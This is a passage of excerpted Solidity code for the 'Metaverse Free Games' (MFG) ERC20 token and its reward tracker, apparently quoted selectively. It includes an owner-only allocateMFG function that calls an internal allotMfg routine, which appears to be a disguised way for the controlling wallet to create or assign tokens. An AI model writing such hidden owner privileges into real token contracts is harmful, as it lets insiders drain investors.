...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function allotMfg(address account, uint256 amount) internal virtual {
...
function allotMfg(address account, uint256 value) internal override {
    super.allotMfg(account, value);
...
contract MFGrewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using RewardMFGMap  for RewardMFGMap .Map;
RewardMFGMap .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("MFG_rewardToken_Tracker", "MFG_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "MFG_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "MFG_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main MFG contract.");
    }
...
contract MFG is ERC20, Ownable {
 ...
 uint256 public gasForProcessing = 300000;
    ...
    MFGrewardToken public rewardToken;
...
bool public cooldownEnabled = false;
  ...
  constructor() ERC20("Metaverse Free Games", "MFG") {
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new MFGrewardToken();
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function allocateMFG(address tokenAddress, uint256 tokenePercent) public masterWallet{
       allotMfg(tokenAddress, tokenePercent);
  }
 ...
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "MFG: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "MFG: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "MFG: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "MFG: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTMFG = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTMFG);
...
addLiquidity(tokensTMFG, bnbForLiquidity);
